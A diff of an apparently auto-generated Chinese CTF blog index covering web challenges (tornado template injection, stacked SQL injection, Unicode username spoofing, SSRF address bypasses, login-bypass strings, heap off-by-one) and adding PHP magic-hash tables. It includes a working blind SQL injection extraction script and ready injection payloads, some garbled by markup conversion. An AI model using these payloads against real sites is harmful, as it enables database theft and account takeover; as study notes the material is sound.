@@ -153,6 +153,8 @@
                 <div class="image-caption"></div>
             </figure>
 
+
+
 <h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>打开看到有三个文件：</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -222,7 +224,7 @@
             </figure>
 
 <p>在 tornado 模板中，存在一些可以访问的快速对象，例如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">  &#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>那么输入：<code>****</code><br>**</p>
 <figure class="image-bubble">
@@ -243,6 +245,8 @@
                 </div>
                 <div class="image-caption"></div>
             </figure>
+
+
 
 <h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>这道题目有两种解法，一种是：<strong>*,1</strong>，这样查询结果会把表中所有的数据返回来（据说是非预期解，出题人可能忘记过滤掉*了）<br>还有一种说是考察 sql_mode，通过堆叠注入修改 sql_mode，<br>可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT  来实现将 <code>||</code> 视为字符串连接符而非   或   运算符<br>因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag</p>
 <p>Payload :<br>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1<br>拼接后就变成了<br>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</p>
@@ -284,6 +288,8 @@
                 </div>
                 <div class="image-caption"></div>
             </figure>
+
+
 
 <h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>网上的  wp  有三个方法，这里只记录一个，Unicode 欺骗<br><a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p>
 <p>注册用户：ᴬdmin<br>会将其变成：Admin<br>修改密码的时候会变成：admin<br>这样就可以直接访问 admin 用户</p>
@@ -341,6 +347,8 @@
 <p>然后在访问同一文件夹下的 index.php  就可以得到 flag  了</p>
 <h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>sql 注入题目，通过基于时间的盲注可以测出来，但是不会写脚本，懒得一个一个测，看了师傅们的 wp<br>  师傅们用了 异或   这种操作，长见识了，师傅们的 WP：<br>（意识到应该整理一些  sqli  的 FUZZ  字典</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://af100f25-ad84-449a-98cc-64ef4e7fda40.node3.buuoj.cn"</span></span><br><span class="line">    flag=<span class="string">"Hello, glzjin wants a girlfriend."</span></span><br><span class="line">    final=<span class="string">""</span></span><br><span class="line">    stop=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">         print(<span class="string">"*"</span>*<span class="number">50</span>,i,<span class="string">"*"</span>*<span class="number">50</span>)</span><br><span class="line">         stop=<span class="number">0</span></span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;<span class="string">"id"</span>:<span class="string">"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))"</span> %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">             html = etree.HTML(re).xpath(<span class="string">"//text()"</span>)</span><br><span class="line">             <span class="comment"># print("&gt;&gt;",html)</span></span><br><span class="line">             <span class="keyword">if</span> flag <span class="keyword">in</span> html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(<span class="string">"\n\t\t\t\t"</span>,final)</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">         <span class="keyword">if</span> stop &gt;= <span class="number">128</span>:</span><br><span class="line">            print(<span class="string">"*"</span>*<span class="number">50</span>,<span class="string">"结束"</span>)</span><br><span class="line">            print(<span class="string">"&gt;&gt;"</span>,final)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure>
+
+
 
 <h1 id="Easy-Cacl"><a href="#Easy-Cacl" class="headerlink" title="Easy Cacl"></a>Easy Cacl</h1><p>** PHP  字符串解析特性**：<br>  当 php  查询字符串进行解析的时候会将某些字符删除或用下划线代替<br>参考：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
 <figure class="image-bubble">
@@ -5024,7 +5032,7 @@
 
 <h1 id="IP-绕过"><a href="#IP-绕过" class="headerlink" title="IP 绕过"></a>IP 绕过</h1><h2 id="添加端口"><a href="#添加端口" class="headerlink" title="添加端口"></a>添加端口</h2><h2 id="短网址"><a href="#短网址" class="headerlink" title="短网址"></a>短网址</h2><h2 id="指向任意-IP-的域名"><a href="#指向任意-IP-的域名" class="headerlink" title="指向任意 IP 的域名"></a>指向任意 IP 的域名</h2><p><strong>xip.io</strong><br>127.0.0.1.xip.io 就会跳转到 127.0.0.1</p>
 <h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><p>0177.0.0.1 -&gt; 127.0.0.1（八进制）<br>0x7f.0.0.1 -&gt; 127.0.01（十六进制）<br>0x7f000001 -&gt; 127.0.0.1（十六进制整数）<br>2130706433 -&gt; 127.0.0.1（十进制整数）</p>
-<p><a href="http://www.baidu.com@127.0.0.1" target="_blank" rel="noopener">www.baidu.com@127.0.0.1</a> 会以 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的身份访问 127.0.0.1</p>
+<p><a href="http://www.baidu.com@127.0.0.1会以www.baidu.com的身份访问127.0.0.1" target="_blank" rel="noopener">www.baidu.com@127.0.0.1会以www.baidu.com的身份访问127.0.0.1</a></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -6623,7 +6631,7 @@
 <td>1</td>
 </tr>
 </tbody></table>
-<p>当扫描第二项 floor(rand(0)<em>2)得到 1，但是 <a href="mailto:1@5.7.19">1@5.7.19</a> 已经存在了，不需要插入，只需要改 count(</em>)</p>
+<p>当扫描第二项 floor(rand(0)<em>2)得到 1，但是<a href="mailto:1@5.7.19">1@5.7.19</a>已经存在了，不需要插入，只需要改 count(</em>)</p>
 <table>
 <thead>
 <tr>
@@ -6637,7 +6645,7 @@
 </tr>
 </tbody></table>
 <p>扫描第三项时 floor(rand(0)<em>2)得到 0，表中没有，需要插入，但是插入的时候进行了第二次运算，floor(rand(0)</em>2)成了 1</p>
-<p>但是虚拟表中已经有了 <a href="mailto:1@5.7.19">1@5.7.19</a>，x 作为主键，是不允许存在相同的，所以就报错了</p>
+<p>但是虚拟表中已经有了<a href="mailto:1@5.7.19">1@5.7.19</a>，x 作为主键，是不允许存在相同的，所以就报错了</p>
 <h2 id="其他函数介绍"><a href="#其他函数介绍" class="headerlink" title="其他函数介绍"></a>其他函数介绍</h2><p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
 <p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
 <p>上面两个需要传入 xpath 格式的字符串，但是传入的却不符合，但可以执行，所以报错</p>
@@ -6726,8 +6734,8 @@
 <li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li>
 </ol>
 <h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，会一起执行</p>
-<p>2019 强网杯题目：随便注<br><code>inject=1&#39;; rename table</code>words<code>to</code>words1<code>;rename table</code>1919810931114514<code>to</code>words<code>;alter table</code>words<code>change</code>flag``id<code>varchar(50);#</code></p>
-<p><code>rename table</code>words<code>to</code>words1<code>;</code>    把查询的表明改成 words1<br><code>rename table</code>1919810931114514<code>to</code>words<code>;</code>  把希望查询的表明改成 words<br><code>alter table</code>words<code>change</code>flag``id<code>varchar(50);#</code>    把 id  与 flag  值互换</p>
+<p>2019 强网杯题目：随便注<br><code>inject=1&#39;; rename table</code>words<code>to</code>words1<code>;rename table</code>1919810931114514<code>to</code>words<code>;alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code></p>
+<p><code>rename table</code>words<code>to</code>words1<code>;</code>    把查询的表明改成 words1<br><code>rename table</code>1919810931114514<code>to</code>words<code>;</code>  把希望查询的表明改成 words<br><code>alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code>    把 id  与 flag  值互换</p>
 <h1 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h1><p>常用：</p>
 <p>admin’ #<br>‘+’<br>‘+’<br>0<br>Aaa’=’<br>原理：<br>单引号闭合，井号注释<br><strong>select * from admin where username=’admin’ #</strong>‘ and password =’’</p>
 <p>Mysql 里 select ‘aaaaa’+1  返回的是 1，会把单引号里面的当成 0<br><strong>select * from admin where username=’’+’’ and password =’’+’’</strong><br><em>*select \</em> from admin where username=0 and password =0<br>**都可以爆出数据</p>
@@ -10333,9 +10341,11 @@
     <url>/2020/06/04/nsmgp5/</url>
     <content><![CDATA[<p>只溢出一个字节，比如定义的数组是 a[4]，在操作的时候却操作 a[4]，实际上数组最大是到 a[3]  的</p>
 <h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ol>
-<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</li>
+<li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</p>
+</li>
+<li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理。另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等</p>
+</li>
 </ol>
-<p>2) 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理。另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等</p>
 <h1 id="看个例子"><a href="#看个例子" class="headerlink" title="看个例子"></a>看个例子</h1><h2 id="首先看一个数组的例子"><a href="#首先看一个数组的例子" class="headerlink" title="首先看一个数组的例子"></a>首先看一个数组的例子</h2><p>可以看下面源码，他  for(i=0;i&lt;=size;i++) 里面那个 i&lt;=size 是有问题的，这样会多循环一次</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -g 1.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="built_in">size</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input:"</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -11465,19 +11475,127 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565490748380-1fcee1ff-9d25-4406-8abf-7752542a49b5.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=image.png&originHeight=289&originWidth=501&size=23167&status=done&style=none&width=384.7679882578129" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565490748380-1fcee1ff-9d25-4406-8abf-7752542a49b5.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=image.png&originHeight=289&originWidth=501&size=23167&status=done&style=stroke&width=384.7679882578129" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>MD5 相同：</p>
-<ul>
-<li>QNKCDZO</li>
-<li>240610708</li>
-<li>s878926199a</li>
-<li>s155964671a</li>
-<li>s214587387a</li>
-<li>s214587387a</li>
-</ul>
+
+<table>
+<thead>
+<tr>
+<th>明文</th>
+<th>MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>240610708</td>
+<td>0e462097431906509019562988736854</td>
+</tr>
+<tr>
+<td>QLTHNDT</td>
+<td>0e405967825401955372549139051580</td>
+</tr>
+<tr>
+<td>QNKCDZO</td>
+<td>0e830400451993494058024219903391</td>
+</tr>
+<tr>
+<td>PJNPDWY</td>
+<td>0e291529052894702774557631701704</td>
+</tr>
+<tr>
+<td>NWWKITQ</td>
+<td>0e763082070976038347657360817689</td>
+</tr>
+<tr>
+<td>NOOPCJF</td>
+<td>0e818888003657176127862245791911</td>
+</tr>
+<tr>
+<td>MMHUWUV</td>
+<td>0e701732711630150438129209816536</td>
+</tr>
+<tr>
+<td>MAUXXQC</td>
+<td>0e478478466848439040434801845361</td>
+</tr>
+<tr>
+<td>IHKFRNS</td>
+<td>0e256160682445802696926137988570</td>
+</tr>
+<tr>
+<td>GZECLQZ</td>
+<td>0e537612333747236407713628225676</td>
+</tr>
+<tr>
+<td>GGHMVOE</td>
+<td>0e362766013028313274586933780773</td>
+</tr>
+<tr>
+<td>GEGHBXL</td>
+<td>0e248776895502908863709684713578</td>
+</tr>
+<tr>
+<td>EEIZDOI</td>
+<td>0e782601363539291779881938479162</td>
+</tr>
+<tr>
+<td>DYAXWCA</td>
+<td>0e424759758842488633464374063001</td>
+</tr>
+<tr>
+<td>DQWRASX</td>
+<td>0e742373665639232907775599582643</td>
+</tr>
+<tr>
+<td>BRTKUJZ</td>
+<td>00e57640477961333848717747276704</td>
+</tr>
+<tr>
+<td>ABJIHVY</td>
+<td>0e755264355178451322893275696586</td>
+</tr>
+<tr>
+<td>aaaXXAYW</td>
+<td>0e540853622400160407992788832284</td>
+</tr>
+<tr>
+<td>aabg7XSs</td>
+<td>0e087386482136013740957780965295</td>
+</tr>
+<tr>
+<td>aabC9RqS</td>
+<td>0e041022518165728065344349536299</td>
+</tr>
+<tr>
+<td>0e215962017</td>
+<td>0e291242476940776845150308577824</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>明文</th>
+<th>MD4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bhhkktQZ</td>
+<td>0e949030067204812898914975918567</td>
+</tr>
+<tr>
+<td>0e001233333333333334557778889</td>
+<td>0e434041524824285414215559233446</td>
+</tr>
+<tr>
+<td>0e00000111222333333666788888889</td>
+<td>0e641853458593358523155449768529</td>
+</tr>
+<tr>
+<td>0001235666666688888888888</td>
+<td>0e832225036643258141969031181899</td>
+</tr>
+</tbody></table>
 <p><strong>第二级</strong></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_error"</span>,<span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"flag&#123;hello_smart_hacker&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You're a fool"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -11537,7 +11655,31 @@
 
 <p><strong>分析</strong></p>
 <p>发现返回值还是 string，所以还是可以用数组让他出错</p>
-<p><a href="http://127.0.0.1/php/type/sha1.php?name%5B%5D=1&password%5B%5D=" target="_blank" rel="noopener">http://127.0.0.1/php/type/sha1.php?name[]=1&amp;password[]=</a><br>就可以</p>
+<p><a href="http://127.0.0.1/php/type/sha1.php?name%5B%5D=1&password%5B%5D=" target="_blank" rel="noopener">http://127.0.0.1/php/type/sha1.php?name[]=1&amp;password[]=</a><br>就可以，另外：</p>
+<table>
+<thead>
+<tr>
+<th>明文</th>
+<th>SHA1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>aaroZmOk</td>
+<td>0e66507019969427134894567494305185566735</td>
+</tr>
+<tr>
+<td>aaK1STfY</td>
+<td>0e76658526655756207688271159624026011393</td>
+</tr>
+<tr>
+<td>aaO8zKZF</td>
+<td>0e89257456677279068558073954252716165668</td>
+</tr>
+<tr>
+<td>aa3OFF9m</td>
+<td>0e36977786278517984959260394024281014729</td>
+</tr>
+</tbody></table>
 <h2 id="MD5-结合-Sqli"><a href="#MD5-结合-Sqli" class="headerlink" title="MD5 结合 Sqli"></a>MD5 结合 Sqli</h2><p>这个字符串：ffifdyop，经过 md5 后会变成：<code>&#39;or&#39;6�]��!r,��b</code></p>
 <p>然后’ or ‘就成功绕过，真的是太巧了</p>
 <p>实验吧的题目：<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p>
@@ -14102,7 +14244,7 @@
 </thead>
 <tbody><tr>
 <td>yichen</td>
-<td>ﾟ ω ﾟﾉ= /｀ｍ ´）ﾉ ~┻━┻   //<em>´∇ ｀</em>/ [‘<em>‘]; o=(ﾟｰﾟ)  =</em>=3; c=(ﾟ Θ ﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟ Д ﾟ) =(ﾟ Θ ﾟ)= (o^<em>^o)/ (o^</em>^o);(ﾟ Д ﾟ)={ﾟ Θ ﾟ: ‘<em>‘ ,ﾟ ω ﾟﾉ : ((ﾟ ω ﾟﾉ==3) +’</em>‘) [ﾟ Θ ﾟ] ,ﾟｰﾟﾉ :(ﾟ ω ﾟﾉ+ ‘<em>‘)[o^</em>^o -(ﾟ Θ ﾟ)] ,ﾟ Д ﾟﾉ:((ﾟｰﾟ==3) +’<em>‘)[ﾟｰﾟ] }; (ﾟ Д ﾟ) [ﾟ Θ ﾟ] =((ﾟ ω ﾟﾉ==3) +’</em>‘) [c^<em>^o];(ﾟ Д ﾟ) [‘c’] = ((ﾟ Д ﾟ)+’</em>‘) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟ Θ ﾟ) ];(ﾟ Д ﾟ) [‘o’] = ((ﾟ Д ﾟ)+’<em>‘) [ﾟ Θ ﾟ];(ﾟ o ﾟ)=(ﾟ Д ﾟ) [‘c’]+(ﾟ Д ﾟ) [‘o’]+(ﾟ ω ﾟﾉ +’</em>‘)[ﾟ Θ ﾟ]+ ((ﾟ ω ﾟﾉ==3) +’<em>‘) [ﾟｰﾟ] + ((ﾟ Д ﾟ) +’</em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +’<em>‘) [ﾟ Θ ﾟ]+((ﾟｰﾟ==3) +’</em>‘) [(ﾟｰﾟ) - (ﾟ Θ ﾟ)]+(ﾟ Д ﾟ) [‘c’]+((ﾟ Д ﾟ)+’<em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟ Д ﾟ) [‘o’]+((ﾟｰﾟ==3) +’</em>‘) [ﾟ Θ ﾟ];(ﾟ Д ﾟ) [‘<em>‘] =(o^</em>^o) [ﾟ o ﾟ][ﾟoﾟ];(ﾟ ε ﾟ)=((ﾟｰﾟ==3) +’<em>‘) [ﾟ Θ ﾟ]+ (ﾟ Д ﾟ) .ﾟ Д ﾟﾉ+((ﾟ Д ﾟ)+’</em>‘) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +’<em>‘) [o^</em>^o -ﾟ Θ ﾟ]+((ﾟｰﾟ==3) +’<em>‘) [ﾟ Θ ﾟ]+ (ﾟ ω ﾟﾉ +’</em>‘) [ﾟ Θ ﾟ]; (ﾟｰﾟ)+=(ﾟ Θ ﾟ); (ﾟ Д ﾟ)[ﾟ ε ﾟ]=’\‘; (ﾟ Д ﾟ).ﾟ Θ ﾟﾉ=(ﾟ Д ﾟ+ ﾟｰﾟ)[o^<em>^o -(ﾟ Θ ﾟ)];(o ﾟｰﾟ o)=(ﾟ ω ﾟﾉ +’</em>‘)[c^<em>^o];(ﾟ Д ﾟ) [ﾟ o ﾟ]=’&quot;‘;(ﾟ Д ﾟ) [‘</em>‘] ( (ﾟ Д ﾟ) [‘<em>‘] (ﾟ ε ﾟ+(ﾟ Д ﾟ)[ﾟ o ﾟ]+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (o^</em>^o))+ (ﾟ Θ ﾟ)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ (ﾟ Θ ﾟ)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ (ﾟｰﾟ)+ (o^<em>^o)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ (c^</em>^o)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ ((o^<em>^o) +(o^</em>^o))+ (ﾟ Д ﾟ)[ﾟ o ﾟ]) (ﾟ Θ ﾟ)) (‘_’);</td>
+<td>ﾟ ω ﾟﾉ= /｀ｍ ´）ﾉ ~┻━┻   //<em>´∇ ｀</em>/ [‘<em>‘]; o=(ﾟｰﾟ)  =</em>=3; c=(ﾟ Θ ﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟ Д ﾟ) =(ﾟ Θ ﾟ)= (o^<em>^o)/ (o^</em>^o);(ﾟ Д ﾟ)={ﾟ Θ ﾟ: ‘<em>‘ ,ﾟ ω ﾟﾉ : ((ﾟ ω ﾟﾉ==3) +’</em>‘) [ﾟ Θ ﾟ] ,ﾟｰﾟﾉ :(ﾟ ω ﾟﾉ+ ‘<em>‘)[o^</em>^o -(ﾟ Θ ﾟ)] ,ﾟ Д ﾟﾉ:((ﾟｰﾟ==3) +’<em>‘)[ﾟｰﾟ] }; (ﾟ Д ﾟ) [ﾟ Θ ﾟ] =((ﾟ ω ﾟﾉ==3) +’</em>‘) [c^<em>^o];(ﾟ Д ﾟ) [‘c’] = ((ﾟ Д ﾟ)+’</em>‘) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟ Θ ﾟ) ];(ﾟ Д ﾟ) [‘o’] = ((ﾟ Д ﾟ)+’<em>‘) [ﾟ Θ ﾟ];(ﾟ o ﾟ)=(ﾟ Д ﾟ) [‘c’]+(ﾟ Д ﾟ) [‘o’]+(ﾟ ω ﾟﾉ +’</em>‘)[ﾟ Θ ﾟ]+ ((ﾟ ω ﾟﾉ==3) +’<em>‘) [ﾟｰﾟ] + ((ﾟ Д ﾟ) +’</em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +’<em>‘) [ﾟ Θ ﾟ]+((ﾟｰﾟ==3) +’</em>‘) [(ﾟｰﾟ) - (ﾟ Θ ﾟ)]+(ﾟ Д ﾟ) [‘c’]+((ﾟ Д ﾟ)+’<em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟ Д ﾟ) [‘o’]+((ﾟｰﾟ==3) +’</em>‘) [ﾟ Θ ﾟ];(ﾟ Д ﾟ) [‘<em>‘] =(o^</em>^o) [ﾟ o ﾟ] [ﾟ o ﾟ];(ﾟ ε ﾟ)=((ﾟｰﾟ==3) +’<em>‘) [ﾟ Θ ﾟ]+ (ﾟ Д ﾟ) .ﾟ Д ﾟﾉ+((ﾟ Д ﾟ)+’</em>‘) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +’<em>‘) [o^</em>^o -ﾟ Θ ﾟ]+((ﾟｰﾟ==3) +’<em>‘) [ﾟ Θ ﾟ]+ (ﾟ ω ﾟﾉ +’</em>‘) [ﾟ Θ ﾟ]; (ﾟｰﾟ)+=(ﾟ Θ ﾟ); (ﾟ Д ﾟ)[ﾟ ε ﾟ]=’\‘; (ﾟ Д ﾟ).ﾟ Θ ﾟﾉ=(ﾟ Д ﾟ+ ﾟｰﾟ)[o^<em>^o -(ﾟ Θ ﾟ)];(o ﾟｰﾟ o)=(ﾟ ω ﾟﾉ +’</em>‘)[c^<em>^o];(ﾟ Д ﾟ) [ﾟ o ﾟ]=’&quot;‘;(ﾟ Д ﾟ) [‘</em>‘] ( (ﾟ Д ﾟ) [‘<em>‘] (ﾟ ε ﾟ+(ﾟ Д ﾟ)[ﾟ o ﾟ]+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (o^</em>^o))+ (ﾟ Θ ﾟ)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ (ﾟ Θ ﾟ)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ (ﾟｰﾟ)+ (o^<em>^o)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ (c^</em>^o)+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ (ﾟ Д ﾟ)[ﾟ ε ﾟ]+(ﾟ Θ ﾟ)+ ((ﾟｰﾟ) + (ﾟ Θ ﾟ))+ ((o^<em>^o) +(o^</em>^o))+ (ﾟ Д ﾟ)[ﾟ o ﾟ]) (ﾟ Θ ﾟ)) (‘_’);</td>
 </tr>
 </tbody></table>
 <h2 id="Jsfuck"><a href="#Jsfuck" class="headerlink" title="Jsfuck"></a>Jsfuck</h2><table>
@@ -14135,7 +14277,7 @@
 <td>佛曰：侄藝顛冥耨俱度哆所皤伽冥槃彌俱彌侄怛侄寫摩皤離冥蘇梵礙得怯真侄槃佛俱遮諳提知寫奢滅無究都依俱是呐依喝菩。殿智三集朋栗俱蒙僧侄輸冥大諳尼三冥栗侄是漫</td>
 </tr>
 </tbody></table>
